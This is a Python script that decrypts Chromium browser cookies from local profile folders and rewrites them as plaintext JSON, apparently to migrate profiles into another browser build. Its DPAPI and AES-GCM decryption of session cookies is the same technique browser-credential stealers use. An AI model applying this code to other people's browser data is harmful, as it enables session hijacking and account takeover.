
import os, json, sqlite3, base64, shutil
from pathlib import Path
try:
    import win32crypt
    from Crypto.Cipher import AES
except ImportError:
    pass

def get_encryption_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_data(data, key):
    try:
        if data.startswith(b'v10') or data.startswith(b'v11'):
            iv = data[3:15]
            ciphertext = data[15:-16]
            tag = data[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            dec = cipher.decrypt_and_verify(ciphertext, tag)
            try:
                return dec.decode('utf-8')
            except UnicodeDecodeError:
                return dec[32:].decode('utf-8', errors='ignore')
        elif data:
            return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8')
        return ''
    except Exception as e:
        return ''

base_old = Path('data/browsers')
base_new = Path('data/cloakbrowser_v146')

for profile_dir in base_old.iterdir():
    if not profile_dir.is_dir() or not profile_dir.name.startswith('profile_'):
        continue
    
    local_state = profile_dir / 'Local State'
    cookie_db = profile_dir / 'Default' / 'Network' / 'Cookies'
    
    new_dir = base_new / profile_dir.name
    
    if not local_state.exists() or not cookie_db.exists() or not new_dir.exists():
        continue
        
    print(f'Restoring cookies for {profile_dir.name}...')
    try:
        key = get_encryption_key(local_state)
        temp_db = 'temp_cookies.db'
        shutil.copy2(cookie_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, path, is_secure, expires_utc, name, value, encrypted_value, is_httponly, samesite FROM cookies')
        
        out_cookies = []
        for host_key, path, is_secure, expires_utc, name, value, encrypted_value, is_httponly, samesite in cursor.fetchall():
            decrypted_val = value
            if encrypted_value:
                dec = decrypt_data(encrypted_value, key)
                if dec: decrypted_val = dec
                
            unix_ts = -1
            if expires_utc > 0:
                unix_ts = max(0, int((expires_utc / 1000000) - 11644473600))
                
            same_site_str = 'None'
            if samesite == 1: same_site_str = 'Lax'
            elif samesite == 2: same_site_str = 'Strict'
            
            c = {
                'name': name,
                'value': decrypted_val,
                'domain': host_key,
                'path': path,
                'secure': bool(is_secure),
                'httpOnly': bool(is_httponly),
                'sameSite': same_site_str
            }
            if unix_ts > 0:
                c['expires'] = unix_ts
            out_cookies.append(c)
            
        conn.close()
        os.remove(temp_db)
        
        if out_cookies:
            out_path = new_dir / 'imported_cookies.json'
            with open(out_path, 'w', encoding='utf-8') as f:
                json.dump(out_cookies, f, indent=2)
            print(f' -> Saved {len(out_cookies)} cookies to {out_path}')
            
    except Exception as e:
        print(f' -> Error: {e}')

